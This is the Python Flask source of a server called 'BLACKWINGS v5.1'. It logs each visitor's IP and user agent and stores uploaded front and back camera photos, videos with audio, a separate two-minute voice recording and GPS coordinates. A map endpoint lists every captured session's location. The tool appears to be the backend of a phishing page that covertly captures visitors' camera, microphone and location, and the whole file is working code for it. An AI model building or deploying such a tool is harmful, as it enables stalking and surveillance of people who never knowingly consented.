#!/usr/bin/env python3
# BLACKWINGS v5.1 — camera + voice-in-video + separate voice + location (Junmo)
# Hardened: thread-safe info.json writes, safe int parsing, no 500s on bad input.
import os, json, uuid, logging, threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template

BASE = os.path.dirname(os.path.abspath(__file__))
CAPTURES = os.path.join(BASE, 'captures')
os.makedirs(CAPTURES, exist_ok=True)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024  # 500 MB
logging.getLogger('werkzeug').setLevel(logging.INFO)

# serialize read-modify-write of info.json (photos + videos + audio uploads can overlap)
INFO_LOCK = threading.Lock()

def _info_path(path):
    return os.path.join(path, 'info.json')

def load_info(path):
    with open(_info_path(path)) as f:
        return json.load(f)

def save_info(path, info):
    with open(_info_path(path), 'w') as f:
        json.dump(info, f, indent=2, ensure_ascii=False)

def update_info(path, mutator):
    """Thread-safe read-modify-write of info.json."""
    with INFO_LOCK:
        info = load_info(path)
        mutator(info)
        save_info(path, info)

def _sid():
    return request.form.get('session_id') or request.args.get('session_id') or \
           (request.get_json(silent=True) or {}).get('session_id')

def _sess_dir(sid):
    path = os.path.join(CAPTURES, sid) if sid else None
    if not path or not os.path.isdir(path):
        return None
    return path

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/map')
def map_page():
    return render_template('map.html')

@app.route('/session', methods=['POST'])
def create_session():
    sid = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + str(uuid.uuid4().int % 1000).zfill(3) + '_1'
    path = os.path.join(CAPTURES, sid)
    os.makedirs(path)
    info = {
        'session_id': sid,
        'timestamp': datetime.now().isoformat(),
        'ip': (request.headers.get('X-Forwarded-For') or request.remote_addr).split(',')[0].strip(),
        'user_agent': request.headers.get('User-Agent', ''),
        'videos': {'front': [], 'back': []},
        'photos': {'front': [], 'back': []},
        'audio_in_video': True,
        'audio': None,          # separate 2-min voice-only recording
        'location': None,
    }
    save_info(path, info)
    return jsonify({'ok': True, 'session_id': sid})

@app.route('/capture', methods=['POST'])
def capture():
    sid = _sid()
    f = request.files.get('photo')
    if not sid or not f:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = _sess_dir(sid)
    if not path:
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    cam = request.form.get('cam', 'front')
    try:
        idx = int(request.form.get('index', '0'))
    except (TypeError, ValueError):
        idx = 0
    name = f"{cam}_{datetime.now().strftime('%H%M%S')}_{uuid.uuid4().int % 1000}.jpg"
    f.save(os.path.join(path, name))
    update_info(path, lambda info: info['photos'].setdefault(cam, []).append(
        {'file': name, 'index': idx, 'ts': datetime.now().isoformat()}))
    return jsonify({'ok': True, 'file': name})

@app.route('/upload', methods=['POST'])
def upload():
    sid = _sid()
    f = request.files.get('video')
    if not sid or not f:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = _sess_dir(sid)
    if not path:
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    cam = request.form.get('cam', 'front')
    mime = f.mimetype or ''
    ext = '.mp4' if 'mp4' in mime else '.webm'
    name = f"{cam}_{datetime.now().strftime('%H%M%S')}_{uuid.uuid4().int % 1000}{ext}"
    full = os.path.join(path, name)
    f.save(full)
    size = os.path.getsize(full)
    update_info(path, lambda info: info['videos'].setdefault(cam, []).append(
        {'file': name, 'duration_s': 60, 'has_audio': True, 'size': size,
         'ts': datetime.now().isoformat()}))
    return jsonify({'ok': True, 'file': name})

@app.route('/upload/audio', methods=['POST'])
def upload_audio():
    sid = _sid()
    f = request.files.get('audio')
    if not sid or not f:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = _sess_dir(sid)
    if not path:
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    mime = f.mimetype or ''
    if 'mp4' in mime or 'm4a' in mime or 'aac' in mime:
        ext = '.m4a'
    elif 'ogg' in mime:
        ext = '.ogg'
    else:
        ext = '.webm'
    name = f"voice_{datetime.now().strftime('%H%M%S')}{ext}"
    full = os.path.join(path, name)
    f.save(full)
    size = os.path.getsize(full)
    update_info(path, lambda info: info.update(audio={
        'file': name, 'duration_s': 120, 'size': size, 'ts': datetime.now().isoformat()}))
    return jsonify({'ok': True, 'file': name})

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json(force=True, silent=True) or {}
    sid = data.get('session_id') or request.form.get('session_id')
    lat, lon, acc = data.get('lat'), data.get('lon'), data.get('accuracy')
    if not sid or lat is None or lon is None:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = _sess_dir(sid)
    if not path:
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    update_info(path, lambda info: info.update(location={
        'lat': float(lat), 'lon': float(lon), 'accuracy_m': float(acc or 0),
        'google_maps': f"https://www.google.com/maps?q={lat},{lon}"}))
    return jsonify({'ok': True})

@app.route('/location/latest')
def latest():
    out = []
    for sid in sorted(os.listdir(CAPTURES), reverse=True):
        p = os.path.join(CAPTURES, sid)
        try:
            with INFO_LOCK:
                info = load_info(p)
        except Exception:
            continue
        loc = info.get('location')
        if not loc:
            continue
        audio = info.get('audio') or {}
        out.append({
            'session_id': sid,
            'lat': loc['lat'],
            'lon': loc['lon'],
            'accuracy_m': loc['accuracy_m'],
            'google_maps': loc['google_maps'],
            'photos': sum(len(v) for v in info.get('photos', {}).values()),
            'videos': sum(len(v) for v in info.get('videos', {}).values()),
            'audio_min': (audio.get('duration_s') or 0) // 60,
            'timestamp': info.get('timestamp'),
        })
    return jsonify({'sessions': out})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)

    